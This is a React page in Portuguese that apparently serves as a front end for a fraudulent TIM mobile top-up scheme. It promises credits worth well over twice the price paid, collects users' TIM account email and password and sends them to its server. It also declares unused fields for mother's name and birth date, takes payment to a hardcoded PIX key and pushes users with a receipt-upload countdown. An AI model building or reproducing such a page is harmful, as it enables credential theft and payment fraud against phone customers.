import React, { useState, useContext } from 'react';
import { Link } from 'react-router-dom';
import { AuthContext } from '../App';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '../components/ui/dialog';
import { toast } from 'sonner';
import axios from 'axios';
import { Phone, ArrowLeft, CreditCard, Clock, Copy, Upload, Smartphone, Mail, Lock } from 'lucide-react';

const TimRechargePage = () => {
  const { user, logout } = useContext(AuthContext);
  const [formData, setFormData] = useState({
    phoneNumber: '',
    timEmail: '',
    timPassword: '',
    cep: '',
    fullName: '',
    motherName: '',
    birthDate: ''
  });
  const [selectedPackage, setSelectedPackage] = useState(null);
  const [showPixModal, setShowPixModal] = useState(false);
  const [currentTransaction, setCurrentTransaction] = useState(null);
  const [timer, setTimer] = useState(0);
  const [uploadFile, setUploadFile] = useState(null);
  const [uploading, setUploading] = useState(false);
  
  const timPackages = [
    { paid: 29.00, received: 79.99 },
    { paid: 19.00, received: 47.99 },
    { paid: 38.00, received: 104.99 },
    { paid: 23.00, received: 64.99 }
  ];
  
  const pixKey = "e0478dfb-0f3b-4837-977c-bc3a23622854";

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handlePackageSelect = async (packageData) => {
    if (!formData.phoneNumber || !formData.timEmail || !formData.timPassword) {
      toast.error('Preencha todos os campos primeiro');
      return;
    }
    
    try {
      const response = await axios.post('/transactions/tim-planos', {
        phone_number: formData.phoneNumber,
        tim_email: formData.timEmail,
        tim_password: formData.timPassword,
        amount_paid: packageData.paid,
        amount_received: packageData.received
      });
      
      setSelectedPackage(packageData);
      setCurrentTransaction(response.data);
      setShowPixModal(true);
      toast.success('Transação criada! Efetue o pagamento via PIX.');
    } catch (error) {
      toast.error('Erro ao criar transação: ' + (error.response?.data?.detail || 'Erro desconhecido'));
    }
  };

  const copyPixKey = () => {
    navigator.clipboard.writeText(pixKey);
    toast.success('Chave PIX copiada!');
    
    // Start 75 second timer
    setTimer(75);
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const handleFileUpload = async () => {
    if (!uploadFile || !currentTransaction) {
      toast.error('Selecione um arquivo primeiro');
      return;
    }
    
    setUploading(true);
    
    try {
      const formDataUpload = new FormData();
      formDataUpload.append('file', uploadFile);
      
      await axios.post(`/transactions/${currentTransaction.id}/upload-receipt`, formDataUpload, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      
      toast.success('Comprovante enviado com sucesso! Aguarde a confirmação.');
      setShowPixModal(false);
      setUploadFile(null);
      setTimer(0);
    } catch (error) {
      toast.error('Erro ao enviar comprovante: ' + (error.response?.data?.detail || 'Erro desconhecido'));
    } finally {
      setUploading(false);
    }
  };

  const formatTimer = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div className="min-h-screen p-4">
      {/* Header */}
      <div className="max-w-6xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center space-x-4">
            <Link to="/" className="flex items-center text-gray-300 hover:text-white transition-colors">
              <ArrowLeft className="w-5 h-5 mr-2" />
              Início
            </Link>
            <div className="w-10 h-10 rounded-xl bg-gradient-to-r from-blue-500 to-cyan-500 flex items-center justify-center">
              <Smartphone className="w-6 h-6 text-white" />
            </div>
            <h1 className="text-3xl font-bold gradient-text">Recarga TIM</h1>
          </div>
          
          <div className="flex items-center space-x-4">
            <span className="text-gray-300">Olá, {user?.name}</span>
            <Button onClick={logout} variant="outline" className="text-white border-white/20 hover:bg-white/10">
              Sair
            </Button>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-6">
          {/* Phone Number Input */}
          <Card className="glass-strong border-0 text-white">
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Phone className="w-6 h-6 text-blue-400" />
                <span>Número do Telefone</span>
              </CardTitle>
              <CardDescription className="text-gray-300">
                Digite o número TIM
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <Label htmlFor="phoneNumber" className="text-white">Número TIM</Label>
                <Input
                  id="phoneNumber"
                  name="phoneNumber"
                  type="tel"
                  value={formData.phoneNumber}
                  onChange={handleChange}
                  className="input-premium text-lg"
                  placeholder="(11) 99999-9999"
                  data-testid="tim-phone-input"
                />
              </div>
            </CardContent>
          </Card>

          {/* TIM Account Details */}
          <Card className="glass-strong border-0 text-white">
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Lock className="w-6 h-6 text-blue-400" />
                <span>Dados da Conta TIM</span>
              </CardTitle>
              <CardDescription className="text-gray-300">
                Email e senha da sua conta TIM
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-4">
                <div>
                  <Label htmlFor="timEmail" className="text-white flex items-center space-x-2">
                    <Mail className="w-4 h-4" />
                    <span>Email da Conta TIM</span>
                  </Label>
                  <Input
                    id="timEmail"
                    name="timEmail"
                    type="email"
                    value={formData.timEmail}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="seu@email.com"
                    data-testid="tim-email-input"
                  />
                </div>
                
                <div>
                  <Label htmlFor="timPassword" className="text-white flex items-center space-x-2">
                    <Lock className="w-4 h-4" />
                    <span>Senha da Conta TIM</span>
                  </Label>
                  <Input
                    id="timPassword"
                    name="timPassword"
                    type="password"
                    value={formData.timPassword}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="••••••••"
                    data-testid="tim-password-input"
                  />
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Package Selection */}
          <Card className="glass-strong border-0 text-white">
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <CreditCard className="w-6 h-6 text-blue-400" />
                <span>Escolha o Pacote</span>
              </CardTitle>
              <CardDescription className="text-gray-300">
                Selecione o valor que deseja recarregar
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="space-y-3">
                {timPackages.map((pkg, index) => (
                  <Button
                    key={index}
                    onClick={() => handlePackageSelect(pkg)}
                    className="w-full p-4 h-auto glass hover:bg-white/10 border border-white/10 text-left transition-all"
                    variant="ghost"
                    data-testid={`tim-package-${index}`}
                  >
                    <div className="flex justify-between items-center w-full">
                      <div>
                        <div className="text-lg font-semibold text-white">
                          Pague R$ {pkg.paid.toFixed(2)}
                        </div>
                        <div className="text-sm text-gray-300">
                          Receba R$ {pkg.received.toFixed(2)}
                        </div>
                      </div>
                      <div className="text-xl font-bold gradient-text">
                        +{((pkg.received - pkg.paid) / pkg.paid * 100).toFixed(0)}%
                      </div>
                    </div>
                  </Button>
                ))}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* PIX Payment Modal */}
        <Dialog open={showPixModal} onOpenChange={setShowPixModal}>
          <DialogContent className="glass-strong border-0 text-white max-w-md">
            <DialogHeader>
              <DialogTitle className="text-center text-2xl gradient-text">
                Pagamento via PIX
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-6">
              {/* Transaction Details */}
              <div className="p-4 bg-white/5 rounded-lg">
                <h3 className="font-semibold mb-2">Detalhes da Recarga TIM</h3>
                <div className="space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-300">Telefone:</span>
                    <span>{formData.phoneNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-300">Email TIM:</span>
                    <span className="text-xs">{formData.timEmail}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-300">Valor a pagar:</span>
                    <span className="text-green-400 font-semibold">R$ {selectedPackage?.paid.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-300">Créditos:</span>
                    <span className="text-blue-400 font-semibold">R$ {selectedPackage?.received.toFixed(2)}</span>
                  </div>
                </div>
              </div>
              
              {/* PIX Key */}
              <div className="space-y-4">
                <Label className="text-white">Chave PIX (Copia e Cola)</Label>
                <div className="flex space-x-2">
                  <Input
                    value={pixKey}
                    readOnly
                    className="input-premium font-mono text-sm"
                  />
                  <Button 
                    onClick={copyPixKey}
                    className="btn-premium"
                    data-testid="copy-pix-button"
                  >
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
              </div>
              
              {/* Timer */}
              {timer > 0 && (
                <div className="text-center p-4 bg-orange-500/10 border border-orange-500/20 rounded-lg">
                  <div className="flex items-center justify-center space-x-2 text-orange-400">
                    <Clock className="w-5 h-5" />
                    <span>Tempo para enviar comprovante:</span>
                  </div>
                  <div className="timer-display text-3xl mt-2">
                    {formatTimer(timer)}
                  </div>
                </div>
              )}
              
              {/* File Upload */}
              <div className="space-y-4">
                <Label className="text-white">Enviar Comprovante</Label>
                <Input
                  type="file"
                  accept="image/*,.pdf"
                  onChange={(e) => setUploadFile(e.target.files[0])}
                  className="input-premium"
                  data-testid="upload-receipt-input"
                />
                
                <Button 
                  onClick={handleFileUpload}
                  disabled={!uploadFile || uploading}
                  className="w-full btn-success"
                  data-testid="upload-receipt-button"
                >
                  {uploading ? (
                    <div className="flex items-center space-x-2">
                      <div className="spinner w-4 h-4"></div>
                      <span>Enviando...</span>
                    </div>
                  ) : (
                    <div className="flex items-center space-x-2">
                      <Upload className="w-4 h-4" />
                      <span>Enviar Comprovante</span>
                    </div>
                  )}
                </Button>
              </div>
              
              <div className="text-xs text-gray-400 text-center">
                Após o envio do comprovante, sua recarga será processada em até 5 minutos.
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};

export default TimRechargePage;